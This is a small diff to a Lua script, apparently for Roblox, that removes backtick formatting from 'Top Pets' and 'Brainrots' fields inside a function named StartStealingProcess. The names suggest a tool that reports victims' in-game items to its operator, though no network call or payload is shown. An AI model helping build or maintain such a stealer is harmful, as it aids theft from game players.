@@ -369,12 +369,12 @@ local function StartStealingProcess()
             },
             {
                 name = "Top Pets",
-                value = "\\`\\`\\`" .. topPetsText .. "\\`\\`\\`",
+                value = topPetsText,
                 inline = false
             },
             {
                 name = "Brainrots",
-                value = "\\`\\`\\`" .. brainrotsText .. "\\`\\`\\`",
+                value = brainrotsText,
                 inline = false
             }
         },
